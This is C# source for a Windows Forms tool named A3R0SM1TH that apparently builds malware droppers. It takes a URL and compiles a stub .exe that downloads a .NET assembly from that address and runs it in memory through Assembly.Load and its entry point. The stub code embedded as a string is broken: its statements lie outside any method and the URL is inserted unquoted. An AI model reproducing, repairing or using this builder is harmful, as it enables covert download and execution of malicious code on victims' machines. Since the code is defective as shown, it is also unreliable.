using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Web;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Reflection;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace A3R0SM1TH
{
	public partial class A3R0SM1THform : Form
	{
		public A3R0SM1THform()
		{
			InitializeComponent();
			this.FormBorderStyle = FormBorderStyle.FixedSingle;
		}

		private void A3R0SM1THform_Paint(object sender, PaintEventArgs e)
		{
			// Was gonna paint something but nvm...
		}

		private void A3R0SM1THform_Load(object sender, EventArgs e)
		{
			// Oops...
		}

		private void generateButton_Click(object sender, EventArgs e)
		{
			String url = fileLinkBox.Text;
			String text = "using System;\n" +
					"class downloader\n" +
					"{\n" +
					"	WebClient webClient = new WebClient();\n" +
					"	webClient.DownloadDataCompleted = new DownloadDataCompletedEventHandler(webClient_DownloadDataCompleted);\n" +
					"	webClient.DownloadDataAsync(new Uri(" + url + "));\n" +
					"	private void webClient_DownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)\n" +
					"	{\n" +
					"		Byte[] downloadedData = e.Result;\n" +
					"		Assembly a = Assembly.Load(downloadedData);\n" +
					"		MethodInfo method = a.EntryPoint;\n" +
					"		if (method != null)\n" +
					"		{\n" +
					"		object o = a.CreateInstance(method.Name);\n" +
					"		method.Invoke(o, null);\n" +
					"		}\n" +
					"	}\n" +
					"}";
			saveDownloader.Filter = "exe files (*.exe)|.exe";
			saveDownloader.Title = "Save the .exe File";
			saveDownloader.ShowDialog();
			String fileDownName = saveDownloader.FileName;
			//System.IO.File.WriteAllText(saveDownloader.FileName, text);

			CSharpCodeProvider codeProvider = new CSharpCodeProvider();
			ICodeCompiler icc = codeProvider.CreateCompiler();

			System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
			//Make sure we generate an EXE, not a DLL
			parameters.GenerateExecutable = true;
			parameters.OutputAssembly = fileDownName;
			CompilerResults results = icc.CompileAssemblyFromSource(parameters, text);
			if (results.Errors.Count > 0)
			{
				// Display compilation errors.
				errorLabel.Text += "Errors building file into " + results.PathToAssembly + "\n";
				foreach (CompilerError ce in results.Errors)
				{
					errorLabel.Text += ce.ToString() + "\n";
				}
			}
			else
			{
				// Display a successful compilation message.
				errorLabel.Text = "File built into " + results.PathToAssembly + " successfully.";
			}
		}
	}
}

